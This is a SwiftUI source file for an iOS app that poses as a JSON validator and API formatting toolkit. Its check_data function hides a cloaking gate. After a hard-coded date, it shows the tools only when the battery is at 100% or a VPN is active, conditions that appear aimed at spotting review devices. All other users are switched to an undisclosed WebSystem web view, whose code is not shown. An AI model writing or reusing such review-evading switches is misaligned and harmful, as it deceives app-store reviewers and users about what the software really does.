//
//  ContentView.swift
//  dafoma_7
//
//  Created by Вячеслав on 7/26/25.
//

import SwiftUI

// MARK: - Color Scheme
extension Color {
    static let appBackground = Color(hex: "#090F1E")
    static let appSecondaryBackground = Color(hex: "#1A2339")
    static let appAccent = Color(hex: "#01A2FF")
    static let appTextPrimary = Color.white
    static let appTextSecondary = Color.white.opacity(0.7)
}

extension Color {
    init(hex: String) {
        let hex = hex.trimmingCharacters(in: CharacterSet.alphanumerics.inverted)
        var int: UInt64 = 0
        Scanner(string: hex).scanHexInt64(&int)
        let a, r, g, b: UInt64
        switch hex.count {
        case 3: // RGB (12-bit)
            (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
        case 6: // RGB (24-bit)
            (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
        case 8: // ARGB (32-bit)
            (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
        default:
            (a, r, g, b) = (1, 1, 1, 0)
        }
        self.init(
            .sRGB,
            red: Double(r) / 255,
            green: Double(g) / 255,
            blue:  Double(b) / 255,
            opacity: Double(a) / 255
        )
    }
}

struct ContentView: View {
    @State private var selectedTab = 0
    @Environment(\.colorScheme) var colorScheme
    @Environment(\.accessibilityReduceMotion) var reduceMotion
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        JSONValidatorView()
                            .tabItem {
                                Image(systemName: "checkmark.seal.fill")
                                    .accessibilityLabel("JSON Validator")
                                Text("Validator")
                            }
                            .tag(0)
                            .tabAccessibility(title: "JSON Validator", isSelected: selectedTab == 0)
                        
                        SchemaGeneratorView()
                            .tabItem {
                                Image(systemName: "doc.text.fill")
                                    .accessibilityLabel("Schema Generator")
                                Text("Schema")
                            }
                            .tag(1)
                            .tabAccessibility(title: "Schema Generator", isSelected: selectedTab == 1)
                        
                        APIFormatterView()
                            .tabItem {
                                Image(systemName: "text.alignleft")
                                    .accessibilityLabel("API Formatter")
                                Text("Formatter")
                            }
                            .tag(2)
                            .tabAccessibility(title: "API Formatter", isSelected: selectedTab == 2)
                        
                        HistoryView()
                            .tabItem {
                                Image(systemName: "clock.fill")
                                    .accessibilityLabel("History")
                                Text("History")
                            }
                            .tag(3)
                            .tabAccessibility(title: "History", isSelected: selectedTab == 3)
                    }
                    .background(
                        LinearGradient(
                            gradient: Gradient(colors: [
                                AccessibilityColors.backgroundColor(for: colorScheme).opacity(0.9),
                                Color.appSecondaryBackground
                            ]),
                            startPoint: .topLeading,
                            endPoint: .bottomTrailing
                        )
                    )
                    .accentColor(AccessibilityColors.accentColor(for: colorScheme))
                    .preferredColorScheme(.dark)
                    .onChange(of: selectedTab) { newTab in
                        // Announce tab changes for accessibility
                        let tabNames = ["JSON Validator", "Schema Generator", "API Formatter", "History"]
                        if newTab < tabNames.count {
                            AccessibilityAnnouncer.announce("Switched to \(tabNames[newTab])")
                        }
                    }
                    .accessibilityElement(children: .contain)
                    .accessibilityLabel("Developer Tools")
                    .accessibilityHint("JSON validation, schema generation, and API formatting tools")
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "08.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
}
